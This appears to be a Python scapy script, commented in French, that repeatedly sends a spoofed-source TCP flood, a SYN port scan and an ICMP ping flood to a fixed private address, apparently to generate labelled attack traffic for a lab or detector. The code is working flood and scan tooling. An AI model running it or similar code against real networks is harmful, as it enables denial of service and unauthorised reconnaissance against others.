import random
from scapy.all import IP, TCP, send, ICMP
from time import sleep

def simulate_attack(target_ip):
    attack_type = random.choice(['ddos', 'port_scan', 'ping_flood'])
    # Définition des codes pour chaque type d'attaque
    attack_codes = {'ddos': 0xC0, 'port_scan': 0xC1, 'ping_flood': 0xC2}

    if attack_type == 'ddos':
        print("Simulating DDoS attack")
        for _ in range(100):
            spoofed_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            packet = IP(src=spoofed_ip, dst=target_ip, tos=attack_codes[attack_type])/TCP(dport=random.randint(1, 65535))
            send(packet, verbose=0)

    elif attack_type == 'port_scan':
        print("Simulating Port Scan")
        for port in range(1, 1024):
            packet = IP(dst=target_ip, tos=attack_codes[attack_type])/TCP(dport=port, flags="S")
            send(packet, verbose=0)

    elif attack_type == 'ping_flood':
        print("Simulating Ping Flood")
        for _ in range(1000):
            packet = IP(dst=target_ip, tos=attack_codes[attack_type])/ICMP()
            send(packet, verbose=0)

# Adresse IP cible pour la simulation
target_ip = "192.168.1.18"

# Simule une attaque à intervalles aléatoires
while True:
    simulate_attack(target_ip)
    sleep_time = random.randint(10, 60)
    print(f"Waiting {sleep_time} seconds before next attack")
    sleep(sleep_time)
